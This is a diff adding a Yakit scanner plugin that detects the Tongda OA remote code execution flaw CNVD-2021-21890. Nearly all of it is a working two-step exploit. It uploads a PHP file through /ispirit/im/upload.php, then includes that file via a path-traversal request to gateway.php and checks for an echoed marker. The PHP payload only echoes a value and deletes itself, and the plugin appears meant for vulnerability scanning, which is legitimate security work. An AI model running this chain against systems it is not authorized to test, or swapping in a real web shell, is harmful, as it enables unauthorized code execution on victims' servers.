@@ -1,0 +1,127 @@
+# port scan plugin
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    uploadpacket = `
+POST /ispirit/im/upload.php HTTP/1.1
+Host: {{params(target)}}
+Content-Length: 658
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+Cookie: PHPSESSID=123
+Connection: close
+
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="UPLOAD_MODE"
+
+2
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="P"
+
+123
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="DEST_UID"
+
+1
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
+Content-Type: image/jpeg
+
+<?php
+$test=$_POST['test'];
+echo $test;
+unlink(__FILE__);
+?>
+------WebKitFormBoundarypyfBh1YB4pV8McGB--`
+
+    rsp,req,_ = poc.HTTP(uploadpacket, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    // yakit.Info("正在上传测试文件...")
+    // log.info("正在上传测试文件...")
+
+    rsphand, rspbody = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    if str.MatchAllOfRegexp(rspbody, `\d*_\d*\|\w*`) {
+        urlpath = str.Split(re.Find(rspbody, `\d*_\d*\|\w*`), `_`)
+        path = urlpath[0] + "/" + re.ReplaceAll(urlpath[1], `\|`, `.`)
+    }else {
+        return
+    }
+    
+    sendpacket = `
+POST /ispirit/interface/gateway.php HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Connection: close
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+X-Forwarded-For: 127.0.0.1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+ 
+json={"url":"../../../general/../attach/im/{{params(path)}}"}&test=bddfc7ae66e16a0d9307374ce45d1293`
+
+    sendrsp,sendreq,_ = poc.HTTP(sendpacket, 
+    poc.params({"target":addr,"path":path}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(sendrsp)
+
+    drsp, derr = str.ParseBytesToHTTPResponse(sendrsp)
+    if derr != nil {
+        yakit.Error(string(derr))
+        return
+    }
+
+    if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `bddfc7ae66e16a0d9307374ce45d1293`) {
+        yakit.Info("Found 通达OA命令执行漏洞 CNVD-2021-21890")
+        log.info("Found 通达OA命令执行漏洞 CNVD-2021-21890")
+        risk.NewRisk(
+            addr,risk.title("通达OA命令执行漏洞 CNVD-2021-21890"),
+            risk.severity("critical"),
+            risk.titleVerbose("通达OA命令执行漏洞 CNVD-2021-21890"),
+            risk.type("RCE[通达OA]"),
+            risk.request(string(sendreq)),
+            risk.response(string(sendrsp)),
+        )
+    }
+
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    // dump(result.GetServiceName())
+    // println("---------------------------")
+    // dump(result.GetCPEs())
+    // println("---------------------------")
+    // dump(result.GetDomains())
+    // println("---------------------------")
+    // dump(result.GetHtmlTitle())
+    // println("---------------------------")
+    // dump(result.GetProto())
+    // println("---------------------------")
+    // dump(result.Fingerprint.banner)
+
+    if len(result.Fingerprint.HttpFlows) > 0 {
+        handleCheck(result.Target,result.Port)
+    }
+    
+}
